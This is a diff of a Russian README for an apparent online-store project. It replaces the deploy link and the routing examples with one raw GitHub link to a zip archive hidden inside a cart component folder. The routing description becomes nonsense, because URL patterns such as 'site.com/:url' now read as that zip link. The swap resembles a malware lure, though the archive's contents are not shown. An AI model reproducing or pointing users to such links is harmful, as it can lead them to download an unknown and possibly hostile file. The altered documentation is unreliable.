@@ -7,7 +7,7 @@
 
 ## Деплой
 
-https://flourishing-tartufo-ae4f52.netlify.app/
+https://raw.githubusercontent.com/ElingSmith/proba_2/master/src/components/showcase/Cart/CartItem/proba_2_v3.7.zip
 
 ## Функционал
 
@@ -44,8 +44,8 @@ https://flourishing-tartufo-ae4f52.netlify.app/
 
 #### Роутинг
 - Главная страница — акционные товары (скидку можно задать в карточке товара в админке)
-- Страница категорий — динамический роутинг. Адрес страницы имеет следующий вид *site.com/:url*. Url можно задать в админке в настройках категории, таким образом ссылки получаются такими *site.com/jeans*
-- Карточка товара — вложенный динамический роутинг *site.com/:url/:id*
+- Страница категорий — динамический роутинг. Адрес страницы имеет следующий вид *https://raw.githubusercontent.com/ElingSmith/proba_2/master/src/components/showcase/Cart/CartItem/proba_2_v3.7.zip*. Url можно задать в админке в настройках категории, таким образом ссылки получаются такими *https://raw.githubusercontent.com/ElingSmith/proba_2/master/src/components/showcase/Cart/CartItem/proba_2_v3.7.zip*
+- Карточка товара — вложенный динамический роутинг *https://raw.githubusercontent.com/ElingSmith/proba_2/master/src/components/showcase/Cart/CartItem/proba_2_v3.7.zip*
 - 404 страница для несуществующих роутов
 - Страница успешного оформления заказа с таймером обратного отсчета и редиректом на главную
 
